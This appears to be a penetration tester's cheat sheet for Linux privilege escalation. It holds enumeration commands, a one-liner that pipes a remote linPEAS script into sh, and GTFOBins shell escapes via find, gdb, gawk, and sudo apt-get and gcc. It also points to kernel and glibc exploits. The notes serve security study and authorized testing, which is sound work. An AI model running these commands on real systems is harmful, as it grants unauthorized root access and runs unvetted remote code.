## Basic Commands
---

```powershell
whoami
id
hostname
uname -a

ls -l /etc/shadow

cat /etc/passwd
cat /etc/issue
cat /etc/os-release

ps aux
ip a
routel
ss -anp
cat /etc/iptables/rules.v4

ls -lah /etc/cron*
crontab -l
sudo crontab -l

dpkg -l
cat /etc/fstab
mount
lsblk
lsmod

/sbin/modinfo nome_di_uno_specifico_modulo
```

## Tools
---
- [unix-privesc-check](https://github.com/pentestmonkey/unix-privesc-check)
- [linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
- [LinEnum](https://github.com/rebootuser/LinEnum) 

### linPEAS oneliner

```shell
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

## Commond abused binaries
---

We can use the [GTFOBins](https://gtfobins.github.io/gtfobins/) to read existent exploitations for binaries in linux. Below more examples.
#### find

```shell
find /home/user/Desktop -exec "/usr/bin/bash" -p \;

find / -writable -type d 2>/dev/null

find / -perm -u=s -type f 2>/dev/null
```

#### gdb

```shell
/usr/bin/gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
```

#### cp

```shell
LFILE=file_to_change
/usr/bin/cp --attributes-only --preserve=all ./cp "$LFILE"
```

#### gawk

```shell
/usr/bin/gawk 'BEGIN {system("/bin/sh")}'
```

### VISUDO
---

In the file `/etc/sudoers` the sysadmin can specify which commands the users can run with the "sudo" keyword that can be used to run the command with elevated privileges. This could led to a many exploit tecniques that we can find referring to GTFObins. Normally users that can run "sudo" are the users listed in the `sudo group`.

#### apt

```shell
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

#### gcc

```shell
sudo gcc -wrapper /bin/sh,-s .
```

## System Investigation

To get all capabilities on file in the system we can use the following commands, also grepping for a specific capability.

```shell
/usr/sbin/getcap -r / 2>/dev/null
/usr/sbin/getcap -r / 2>/dev/null | grep -i setuid
```

## Searchexploit for Privilege Escalation

There are many exploits for many linux kernel versions out there. We can check the OS Version with cat /etc/os-release. Famous examples of Linux kernel exploits are [DirtyCow](https://dirtycow.ninja/) or [DirtyPipe](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits). There is also a recent exploit on the GNU C Library [Looney Tunables](https://github.com/hadrian3689/looney-tunables-CVE-2023-4911) that can work on newer systems as a privilege escalation. An interesting and recent case is the Pkexec Local Privilege Escalation exploit that can be run with [PwnKit](https://github.com/ly4k/PwnKit). Many of this exploits can be found directly with `searchsploit`.